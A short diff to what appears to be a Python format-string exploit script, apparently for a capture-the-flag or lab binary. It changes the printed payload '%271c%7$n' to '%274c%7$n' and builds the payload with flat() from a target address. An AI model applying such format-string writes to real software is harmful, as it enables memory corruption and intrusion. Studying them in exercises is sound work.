@@ -20,7 +20,7 @@ print "Distance to fmt_buf = 7args"
 print "targetBuf_address = ", hex(magic)
 print "write = ", write
 print "hex(write) = ", hex(write)
-print "payload = %271c%7$n"
+print "payload = %274c%7$n"
 print "=========================\n"
 
 payload = flat([magic])
